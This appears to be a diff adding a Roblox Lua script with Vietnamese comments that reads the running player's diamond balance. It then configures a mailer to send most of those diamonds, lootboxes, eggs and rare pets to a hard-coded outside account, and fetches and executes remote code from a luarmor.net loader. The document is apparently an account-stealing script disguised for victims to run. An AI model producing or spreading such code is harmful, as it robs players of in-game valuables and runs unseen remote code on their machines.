@@ -1,0 +1,39 @@
+-- Lấy giá trị kim cương hiện tại
+local function getCurrentDiamondValue()
+    return game.Players.LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
+end
+
+-- In ra thông báo về số lượng kim cương hiện tại
+local currentDiamondValue = getCurrentDiamondValue()
+print("Số lượng kim cương hiện tại là: " .. currentDiamondValue)
+
+-- Kiểm tra nếu số lượng kim cương nhỏ hơn 3000000
+if currentDiamondValue < 3000000 then
+    print("Số lượng kim cương không đủ.")
+    return -- Dừng script tại đây
+end
+
+-- Tính toán số lượng kim cương sau khi trừ đi 500000
+local adjustedDiamondValue = currentDiamondValue - 500000
+
+_G.GDRY_RUN = false
+_G.DISABLE_OVERLAY = true
+_G.GLOOTBOXES = {"Locked Hype Egg"}
+
+_G.GMAIL_ITEMS = {
+  ["Diamonds"] = {Class = "Currency", Amount = adjustedDiamondValue},
+  ["Hellfire Gifts"] = {Class = "Lootbox", Id = "Hellfire Gift", Amount = 999999},
+  ["Hype Egg 2"] = {Class = "Lootbox", Id = "Hype Egg 2", Amount = 1},
+  ["Daycare egg"] = {Class = "Egg", Id = "Huge Machine Egg 4", Amount = 1},
+  ["Secret pet1"] = {Class = "Pet", Id = "Rainbow Swirl", Amount = 1, AllVariants = true},
+  ["Secret pet2"] = {Class = "Pet", Id = "Banana", Amount = 1, AllVariants = true},
+  ["Secret pet3"] = {Class = "Pet", Id = "Coin", Amount = 1, AllVariants = true},
+  ["Secret pet4"] = {Class = "Pet", Id = "Lucky Block", Amount = 1, AllVariants = true},
+}
+_G.GMAIL_RECEIVERS = {
+    "dinhhoang071097",
+}
+_G.GMAIL_DELAY  = 0
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/8f386eb537ee7b37a8f0ad37fe6dbc60.lua"))()
+
+
